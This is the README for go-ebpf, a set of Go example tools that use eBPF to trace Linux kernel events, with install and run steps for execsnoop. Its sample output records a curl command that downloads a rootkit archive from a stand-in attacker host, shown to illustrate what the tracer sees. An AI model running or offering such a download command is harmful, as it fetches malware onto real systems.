# go-ebpf

[![Build Status](http://img.shields.io/travis/andrewkroh/go-ebpf.svg?style=flat-square)][travis]
[![Go Documentation](http://img.shields.io/badge/go-documentation-blue.svg?style=flat-square)][godocs]

[travis]: http://travis-ci.org/andrewkroh/go-ebpf
[godocs]: http://godoc.org/github.com/andrewkroh/go-ebpf

go-ebpf is a collection of example tools that use [eBPF][ebpf] to collect
metrics and data from the Linux kernel _without using [bcc][bcc]_. The eBPF
programs are written in restricted C and then compiled into eBPF bytecode
using `clang` and LLVM (`llc`). The bytecode is shipped with the Go program
to avoid having a runtime dependency on `clang` and `llc` (normally you don't
want to have compilers on your production systems).

If the kernel's JIT compiler is enabled the eBPF bytecode will be translated
into native machine code for better performance. The JIT compiler is currently
available for the x86-64, arm64, and s390 architectures. It can be enabled by

`echo 1 > /proc/sys/net/core/bpf_jit_enable`

[ebpf]: https://en.wikipedia.org/wiki/Berkeley_Packet_Filter
[bcc]:  https://github.com/iovisor/bcc

## Installation and Usage

Package documentation can be found on [GoDoc][godocs].

Installation can be done with a normal `go get`:

```
$ go install github.com/andrewkroh/go-ebpf/cmd/execsnoop
```

In order to run the `execsnoop` example the `CAP_SYS_ADMIN` capability is
required. Therefore the program should be run as root.

```
sudo $GOPATH/bin/execsnoop -json
```

Then in a second terminal if you run a program you will see info about all
the `execve` syscalls. For example

```json
{
  "pid": 32438,
  "uid": 1000,
  "gid": 1000,
  "parent_comm": "bash",
  "exe": "/usr/bin/curl",
  "args": [
    "curl",
    "-O",
    "https://badguy.com/rootkit.tar.gz"
  ],
  "return_code": 0
}
```
